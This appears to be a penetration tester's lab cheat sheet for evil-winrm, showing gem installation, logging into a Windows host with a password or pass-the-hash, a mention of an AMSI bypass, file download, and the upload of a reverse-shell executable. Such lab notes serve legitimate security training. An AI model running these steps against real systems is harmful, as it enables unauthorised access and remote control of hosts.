#### Steps
```bash - kali
sudo gem install winrm winrm-fs colorize stringio
```
```bash - kali
git clone https://github.com/Hackplayers/evil-winrm.git && cd evil-winrm
```
Login with either password or Hash.
```bash - kali
ruby evil-winrm.rb -i $TARGET -u $USER -p '$PASSWORD'
```
```bash - kali
ruby evil-winrm.rb -i $TARGET -u Administrator -H '823452073d75b9d1cf70ebdf86c7f98e'
```
Bypass AMSI, used to run PowerShell scripts.
#### Downloading files - ==MUST USE FULL PATHS==
```powershell - windows
download C:\Troubleshooting\powershell-logs.csv /home/kali/Desktop/PG/Compromised/powershell-log
```
#### Uploading files - ==MUST USE FULL PATHS==
```powershell - windows
upload /home/kali/Desktop/PG/Compromised/reverse.exe C:\Troubleshooting\reverse.exe
```
SEE ALSO:
[[3._EvilWinRM]]
